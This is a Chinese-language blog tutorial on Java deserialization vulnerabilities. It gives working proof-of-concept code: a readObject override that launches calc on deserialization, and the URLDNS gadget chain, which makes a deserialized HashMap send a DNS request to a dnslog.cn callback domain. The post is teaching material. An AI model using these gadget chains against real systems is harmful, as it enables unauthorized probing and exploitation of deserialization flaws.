---
title: '信息安全学习-Java 反序列化漏洞基础'
tags:
  - 信息安全
readmore: true
layout: post
date: 2023-06-16 03:22:28
---

### 简介

序列化：对象 -> 字符串； 反序列化：字符串 -> 对象；

序列化与反序列化主要是用来传输数据，当两个进程进行通信时，可以通过序列化和反序列化来进行传输。

序列化的好处：

1. 能够实现数据的持久化，通过序列化可以把数据永久地保存在硬盘上，相当于通过序列化的方式将数据保存在文件中。
2. 利用序列化实现远程通信，在网络上传输对象的字节序列。

序列化与反序列化应用的场景

1. 把内存中的对象保存在文件或数据库中。
2. 用套接字（Socket）在网络上传输对象。
3. 通过 RMI 传输对象的时候。

<!-- more -->

### 序列化与反序列化的代码例子

下列代码中的 package 需要修改成自己的 package 路径。

* 类文件：**Person.java**

```java
package com.mewhz.model;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {
    // 实现 Serializable 接口后这个类可以被序列化和反序列化

    private String name;
    private int age;

    public Person() {
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

* 序列化文件：SerializationTest.java

```java
package com.mewhz.test;

import com.mewhz.model.Person;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerializationTest {
    
    public static void main(String[] args) throws IOException {
        
        Person person = new Person("小明", 12);
        // .ser 是 Java 序列化文件
        FileOutputStream fos = new FileOutputStream("person.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);

        oos.writeObject(person);
        oos.close();

        fos.close();

    }
}
```

* 反序列化文件：UnSerializationTest.java

```java
package com.mewhz.test;

import com.mewhz.model.Person;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnSerializationTest {
    
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        
        FileInputStream fis = new FileInputStream("person.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        Object object = ois.readObject();

        Person person = (Person)object;

        System.out.println(person);
    }
}
```

---

先运行 SerializationTest 在运行 UnSerializationTest 发现成功输出对象的信息，且本地保存了一个 person.ser 的文件。

![image-20230616034048351](https://pic.mewhz.com/blog/image-20230616034048351.png)

### 反序列化安全漏洞产生的原因

Java 序列化机制虽然有默认序列化机制，但同时也支持用户自定义的序列化和反序列化策略。而自定义序列化规则的方式就是重写 writeObject 与 readObject，当对象重写了 writeObject 或 readObject 方法时，Java 序列化与反序列化就会调用用户自定义的方法。

* 修改类文件 Person.java

```java
package com.mewhz.model;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Person implements Serializable {

    private String name;
    private int age;

    public Person() {
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
		// 重写 readObject 方法后，在反序列化时会调用用户重写的 readObject
        
        ois.defaultReadObject();

        // 弹出计算器软件
        Runtime.getRuntime().exec("calc");
    }
}
```

同样先运行 SerializationTest 在运行 UnSerializationTest，发现成功弹出计算器软件。

![image-20230616034903268](https://pic.mewhz.com/blog/image-20230616034903268.png)

### URLDNS 利用链

URLDNS 链是 Java 众多利用链中最简单的一条利用链。该利用链只依赖 JDK 本身提供的类，不依赖其他第三方类，具有很高的通用性，可以用于判断目标是否存在反序列化漏洞；该利用链本身只能执行域名解析的操作，不能执行系统命令或者其他恶意操作。

反序列化入口是在 HashMap 的 readObject 方法，该类重写了 readObject，此时反序列化时会调用该方法

![image-20230619102251727](https://pic.mewhz.com/blog/image-20230619102251727.png)

找到 readObject 方法的，这个方法会调用本类的 hash 方法

![image-20230619103417484](https://pic.mewhz.com/blog/image-20230619103417484.png)

hash 方法中，在这个方法会调用 key 的 hashCode 方法，其中 key 是 Object 类，若传递的类重写了 hashCode 方法则调用类的 hashCode 方法

![image-20230619104923169](https://pic.mewhz.com/blog/image-20230619104923169.png)

打开 java.net.URL 类的 hashCode 方法，会调用 handler 属性的 hashCode 方法

![image-20230619110323914](https://pic.mewhz.com/blog/image-20230619110323914.png)

handler 定义来自于 URLStreamHandler ，所以会调用该类的 hashCode 方法

![image-20230619110706382](https://pic.mewhz.com/blog/image-20230619110706382.png)

来到 URLStreamHandler 的 hashCode 方法，其中调用 getHostAddress 方法，该方法执行后会进行域名到IP 地址的解析请求

![image-20230619111515955](https://pic.mewhz.com/blog/image-20230619111515955.png)

访问 http://dnslog.cn/ 申请一个域名地址

![image-20230619230442787](https://pic.mewhz.com/blog/image-20230619230442787.png)

重新修改 SerializationTest 和 UnSerializationTest 类

```java
package com.mewhz.test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {
    
    public static void main(String[] args) throws IOException {

        HashMap<URL, Integer> hashMap = new HashMap<>();

        hashMap.put(new URL("http://g8mx64.dnslog.cn"), 1);

        FileOutputStream fos = new FileOutputStream("map.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);

        oos.writeObject(hashMap);
        oos.close();

        fos.close();

    }
}
```

```java
package com.mewhz.test;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.HashMap;

public class UnSerializationTest {
    
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream("map.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        Object object = ois.readObject();

        HashMap hashMap = (HashMap)object;

        System.out.println(hashMap);
    }
}
```

运行 SerializationTest 类后，返回 dnslog 网站，发现这时就已经发送了请求；

![image-20230619230608409](https://pic.mewhz.com/blog/image-20230619230608409.png)

这是因为 HashMap 在执行 put 方法时会调用 URL 类的 hashCode 方法，此时若 hashCode 变量不等于 -1 时，会直接返回 hashCode，反之则会执行 handler 的 hashCode 方法，进而发送请求。

![image-20230619230231390](https://pic.mewhz.com/blog/image-20230619230231390.png)

再运行 UnSerializationTest 类后，返回 dnslog 网站，并没有新的请求出现；

这是由于 Java 内部对 DNS 请求存在缓存机制，所以当反序列化的时候会优先从 DNS 缓存中查找域名解析记录，那么反序列化的时候就收不到 DNS 请求数据。

找到原因后，可以通过反射的方法，在 HashMap 调用 put 之前修改 hashCode 字段的值不等于 -1，由于反序列化时还需要调用 handler 的 hashCode 方法，所以再次通过反射的方法将 hashCode 字段修改等于 -1。

仅修改 SerializationTest 类即可

```java
package com.mewhz.test;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class SerializationTest {

    public static void main(String[] args) throws Exception {

        HashMap<URL, Integer> hashMap = new HashMap<>();

        URL url = new URL("http://g8mx64.dnslog.cn");

        // 通过反射获取 URL 类中的 hashCode 字段
        Field hashcode = url.getClass().getDeclaredField("hashCode");

        // 可访问标志表示是否屏蔽 Java 语言的访问检查，默认值是false
        // 修改可访问标志，如此会屏蔽 Java 语言(运行时)的访问检查
        hashcode.setAccessible(true);

        // 设置 hashCode 的值不等于 -1
        hashcode.set(url, 1234);

        hashMap.put(url, 1);
        // 把 hashCode 改为 -1, 为了后续还能调用 handler 的 hashCode 方法
        hashcode.set(url, -1);

        FileOutputStream fos = new FileOutputStream("map.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);

        oos.writeObject(hashMap);
        oos.close();

        fos.close();

    }
}
```

重新在 dnslog 申请一个域名 (单击 Get SubDomain 按钮) 并复制到代码中；

运行 SerializationTest 类并没有发送请求，再运行 UnSerializationTest 类，成功在 dnslog 网站上获取请求。

于是整个 URLDNS 的 gadget (利用链也叫 "gadget chains"，通常称为gadget。它连接的是从触发位置开始到执行命令的位置结束)：

>1. HashMap -> readObject()
>2. HashMap -> hash()
>3. URL -> hashCode()
>4. URLStreamHandler -> hashCode()
>5. URLStreamHandler -\>getHostAddress()
>6. InetAddress -> getByName()

### 参考资料

[Java反序列化基础篇-01-反序列化概念与利用](https://www.freebuf.com/articles/web/333697.html)

[告别脚本小子系列丨JAVA安全(6)——反序列化利用链（上）](https://mp.weixin.qq.com/s/o_N4Hk4gstqnzfqfjutA3w)

[Java反射的setAccessible()方法(简单易懂版)](https://blog.csdn.net/gao_zhennan/article/details/123828322)

[JAVA中DNS缓存设置](https://blog.csdn.net/guanfengliang1988/article/details/92813431)
